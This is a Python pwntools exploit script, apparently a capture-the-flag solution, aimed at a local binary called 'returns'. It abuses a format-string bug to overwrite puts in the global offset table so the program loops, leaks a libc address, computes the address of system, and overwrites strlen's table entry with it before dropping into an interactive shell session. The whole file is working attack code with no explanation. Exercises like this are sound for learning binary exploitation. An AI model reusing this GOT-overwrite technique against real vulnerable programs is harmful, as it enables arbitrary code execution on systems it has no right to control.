from pwn import *
import struct

main = 0x0000000000400757
puts_got = 0x0000000000601018
loop = '%12$hn'+'%64x'+'%13$hn'+'%1815x'+'%14$hn'+'AAA\x00'+struct.pack('<Q', puts_got+4)+struct.pack('<Q', puts_got+2)+struct.pack('<Q', puts_got)

libc_start_main = 0x7fc7dccd2b97
libc_system = 0x7fc7dcd00440
libc_system_offset = libc_system - libc_start_main
leak = '%33$p'

p = process("./returns")
p.sendline(loop)
p.sendline(leak)
p.sendline()

p.readuntil('0x')
libc_start_main = int(p.readuntil('.')[:-1], 16)
libc_system = libc_start_main + libc_system_offset
libc_system_hex = hex(libc_system)[-8:]
strlen_got = 0x0000000000601020

upper = int(libc_system_hex[:4], 16)
lower = int(libc_system_hex[4:], 16)
shell_format = '%{}x'+'%12$hn'+'%{}x'+'%13$hn'
if upper < lower:
	shell_format = shell_format.format(upper, lower-upper)
	shell_addresses = struct.pack('<Q', strlen_got+2)+struct.pack('<Q', strlen_got)
else:
	shell_format = shell_format.format(lower, upper-lower)
	shell_addresses = struct.pack('<Q', strlen_got)+struct.pack('<Q', strlen_got+2)
shell = shell_format+'A'*(32-len(shell_format)-1)+'\x00'+shell_addresses

print(libc_system_hex)
print(repr(shell))

p.sendline(shell)
p.interactive()